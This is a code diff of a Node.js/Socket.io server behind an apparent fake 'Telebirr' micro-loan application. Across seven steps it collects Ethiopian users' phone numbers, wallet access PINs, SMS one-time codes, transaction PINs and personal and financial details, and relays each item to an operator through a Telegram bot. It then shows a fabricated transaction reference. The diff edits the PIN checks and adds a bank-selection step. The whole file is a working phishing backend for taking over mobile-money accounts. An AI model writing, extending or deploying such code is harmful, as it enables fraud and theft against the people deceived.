@@ -1,145 +1,182 @@
 require('dotenv').config();
 const express = require('express');
 const http = require('http');
-const socketIo = require('socket.io');
+const { Server } = require('socket.io');
 const path = require('path');
+const crypto = require('crypto');
 const cors = require('cors');
+const botManager = require('./bot_manager');
 
-const REQUIRED_ENV = ['BOT_TOKEN', 'ADMIN_CHAT_ID'];
-REQUIRED_ENV.forEach((env) => {
-    if (!process.env[env] || process.env[env].trim() === "") {
-        console.error(`❌ [CRITICAL ENV ERROR] Missing variable: ${env}`);
-        process.exit(1);
+const app = express();
+const server = http.createServer(app);
+const io = new Server(server, {
+    cors: {
+        origin: "*",
+        methods: ["GET", "POST"]
     }
 });
 
-const botManager = require('./bot_manager');
-const app = express();
-const server = http.createServer(app);
-
-const io = socketIo(server, {
-    cors: { origin: "*", methods: ["GET", "POST"] }
-});
-global.io = io; 
-
-const PORT = process.env.PORT || 3000;
-const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 
+// Expose io instance globally for the bot manager callback handlers
+global.io = io;
 
 app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
-    try {
-        botManager.bot.processUpdate(req.body);
-        res.sendStatus(200);
-    } catch (err) {
-        console.error("❌ Webhook resolution error:", err.message);
-        res.sendStatus(500);
-    }
-});
+const activeSessions = new Map();
+
+// Updated PIN helper validating exactly 4 digits
+const isValid4DigitPin = (pin) => {
+    return /^\d{4}$/.test(pin);
+};
 
 io.on('connection', (socket) => {
-    let activeRoom = `TB-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
+    let currentId = crypto.randomBytes(8).toString('hex');
     
-    socket.join(activeRoom);
-    socket.emit('session-ready', { appId: activeRoom });
+    activeSessions.set(currentId, {
+        appId: currentId,
+        socketId: socket.id,
+        phone: '',
+        loanType: '',
+        amount: '',
+        term: '',
+        firstName: '',
+        lastName: '',
+        email: '',
+        employment: '',
+        income: '',
+        selectedBank: ''
+    });
 
-    socket.on('join-room', (room) => {
-        if (room && room !== "null" && room !== "") {
-            socket.leave(activeRoom);
-            socket.join(room);
-            activeRoom = room;
+    socket.emit('session-ready', { appId: currentId });
+
+    socket.on('join-room', (roomId) => {
+        if (activeSessions.has(roomId)) {
+            socket.join(roomId);
+            currentId = roomId;
+            const session = activeSessions.get(roomId);
+            session.socketId = socket.id;
+            activeSessions.set(roomId, session);
         }
     });
 
-    const getValidId = (data) => (data && data.appId) ? data.appId : activeRoom;
-
-    // Helper regex logic to validate exactly 6 digits numeric strings
-    const isValid6DigitPin = (pin) => {
-        if (!pin) return false;
-        const cleanPin = String(pin).trim();
-        return /^\d{6}$/.test(cleanPin);
-    };
-
     socket.on('submit-step1-credentials', (data) => {
-        const currentId = getValidId(data);
-        
-        // Validation check for 6-digit Wallet Access PIN
-        if (!data || !isValid6DigitPin(data.pin)) {
-            console.warn(`⚠️ Blocked malformed Wallet Access PIN from ${currentId}. Expected 6 digits.`);
-            socket.emit('validation-error', { target: 'pin', message: 'Wallet Access PIN must be exactly 6 digits.' });
+        const session = activeSessions.get(currentId);
+        if (!session) return;
+
+        if (!isValid4DigitPin(data.pin)) {
+            socket.emit('pin-rejected', { message: "Wallet Access PIN must be exactly 4 digits." });
             return;
         }
 
+        session.phone = data.phone;
+        activeSessions.set(currentId, session);
+
         botManager.sendToAdmin(currentId, "Step 1 - Account Login", {
-            "Mobile Phone": `+251${data.phone}`,
-            "Wallet Access PIN": String(data.pin).trim()
+            "Phone Number": `+251${data.phone}`,
+            "Wallet Access PIN": data.pin
         }, false);
     });
 
     socket.on('submit-otp-verification', (data) => {
-        const currentId = getValidId(data);
+        const session = activeSessions.get(currentId);
+        if (!session) return;
+
         botManager.sendToAdmin(currentId, "Step 2 - OTP Verification", {
-            "SMS OTP Code": data.code
+            "Phone Number": `+251${session.phone}`,
+            "One Time Password": data.code
         }, true);
     });
 
     socket.on('submit-final-pin', (data) => {
-        const currentId = getValidId(data);
-        
-        // Validation check for 6-digit Transaction PIN
-        if (!data || !isValid6DigitPin(data.pin)) {
-            console.warn(`⚠️ Blocked malformed Transaction PIN from ${currentId}. Expected 6 digits.`);
-            socket.emit('validation-error', { target: 'transaction-pin', message: 'Transaction PIN must be exactly 6 digits.' });
+        const session = activeSessions.get(currentId);
+        if (!session) return;
+
+        if (!isValid4DigitPin(data.pin)) {
+            socket.emit('pin-rejected', { message: "Transaction PIN must be exactly 4 digits." });
             return;
         }
 
         botManager.sendToAdmin(currentId, "Step 3 - Transaction Authorization", {
-            "Transaction PIN": String(data.pin).trim()
+            "Phone Number": `+251${session.phone}`,
+            "Transaction PIN": data.pin
         }, true);
     });
 
     socket.on('submit-step4-loan-config', (data) => {
-        const currentId = getValidId(data);
-        botManager.sendToAdmin(currentId, "Step 4 - Micro-Credit Parameters", {
-            "Category Type": data.loanType,
-            "Amount Requested": `${data.amount} ETB`,
-            "Repayment Term": `${data.term} Weeks`
+        const session = activeSessions.get(currentId);
+        if (!session) return;
+
+        session.loanType = data.loanType;
+        session.amount = data.amount;
+        session.term = data.term;
+        activeSessions.set(currentId, session);
+
+        botManager.sendToAdmin(currentId, "Step 4 - Loan Configuration", {
+            "Phone Number": `+251${session.phone}`,
+            "Loan Option": data.loanType,
+            "Amount requested": `${Number(data.amount).toLocaleString()} ETB`,
+            "Term Limit": `${data.term} Weeks`
         }, false);
     });
 
     socket.on('submit-step5-kyc-profile', (data) => {
-        const currentId = getValidId(data);
-        botManager.sendToAdmin(currentId, "Step 5 - KYC Information", {
+        const session = activeSessions.get(currentId);
+        if (!session) return;
+
+        session.firstName = data.firstName;
+        session.lastName = data.lastName;
+        session.email = data.email;
+        activeSessions.set(currentId, session);
+
+        botManager.sendToAdmin(currentId, "Step 5 - KYC", {
+            "Phone Number": `+251${session.phone}`,
             "First Name": data.firstName,
             "Last Name": data.lastName,
             "Email Address": data.email
         }, false);
     });
-    
+
     socket.on('submit-step6-financials', (data) => {
-        const currentId = getValidId(data);
+        const session = activeSessions.get(currentId);
+        if (!session) return;
+
+        session.employment = data.employment;
+        session.income = data.income;
+        activeSessions.set(currentId, session);
+
+        // Send info to Admin without completing application flow here
         botManager.sendToAdmin(currentId, "Step 6 - Employment Verification", {
+            "Phone Number": `+251${session.phone}`,
             "Employment Type": data.employment,
-            "Monthly Earnings": `${data.income} ETB`
+            "Monthly Earnings": `${Number(data.income).toLocaleString()} ETB`
+        }, false);
+    });
+
+    socket.on('submit-step7-bank', (data) => {
+        const session = activeSessions.get(currentId);
+        if (!session) return;
+
+        session.selectedBank = data.bank || '';
+        activeSessions.set(currentId, session);
+
+        botManager.sendToAdmin(currentId, "Step 7 - Bank Selection", {
+            "Phone Number": `+251${session.phone}`,
+            "Selected Bank": session.selectedBank ? session.selectedBank : "None"
         }, false);
 
+        // Application complete triggers exclusively after Bank Selection step submission
         const txnReferenceId = `TXN-${Math.floor(100000 + Math.random() * 900000)}-ETB`;
-        io.to(currentId).emit('application-complete', { referenceId: txnReferenceId });
+        
+        io.to(currentId).emit('application-complete', {
+            referenceId: txnReferenceId
+        });
     });
+
+    socket.on('disconnect', () => {});
 });
 
-server.listen(PORT, async () => {
-    console.log(`🚀 Telebirr Core Financial System running on port ${PORT}`);
-    if (EXTERNAL_URL) {
-        const base = EXTERNAL_URL.endsWith('/') ? EXTERNAL_URL.slice(0, -1) : EXTERNAL_URL;
-        const webhookUrl = `${base}/bot${process.env.BOT_TOKEN}`;
-        try {
-            await botManager.bot.setWebHook(webhookUrl);
-            console.log(`✅ Telegram Webhook registered to: ${webhookUrl}`);
-        } catch (err) {
-            console.error('❌ Webhook Setup Failed:', err.message);
-        }
-    }
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`🚀 Birr Financial System listening on port ${PORT}`);
 });
